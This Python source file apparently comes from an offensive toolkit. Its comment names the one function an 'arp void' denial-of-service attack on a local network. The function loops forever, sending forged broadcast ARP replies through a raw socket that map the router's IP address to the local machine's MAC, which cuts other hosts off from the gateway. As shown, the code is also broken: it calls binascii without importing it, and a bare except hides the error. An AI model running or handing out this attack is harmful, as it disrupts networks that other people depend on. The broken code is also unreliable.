from TheSilent.clear import *

import ipaddress
import socket
import uuid

red = "\033[1;31m"

#denial of service attack against local area network using an arp void attack
def arp_void(router):
    clear()

    mac = hex(uuid.getnode())
    og_mac = str(mac).replace("0x", "")
    mac = ":".join(mac[i:i + 2] for i in range(0, len(mac), 2))  
    mac = str(mac).replace("0x:", "")
    
    host_name = socket.gethostname()
    host_ip = socket.gethostbyname(host_name)
    og_ip = host_ip.replace(".", "")

    interface = socket.if_nameindex()

    print(red + "mac address: " + mac + " | ip address: " + router + " | interface: " + str(interface[1][1]))

    router = hex(int(ipaddress.IPv4Address(router)))
    router = str(router).replace("0x", "")
    
    while True:
        

        try:
            try:
                my_code = binascii.unhexlify("ffffffffffff" + og_mac + "08060001080006040002"  + og_mac + router + "ffffffffffff" + "00000000")
                super_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
                super_socket.bind((interface[1][1], 0))
                super_socket.sendall(my_code)
                print("packet sent")

            except binascii.Error:
                pass

        except:
            print(red + "ERROR!")
            continue
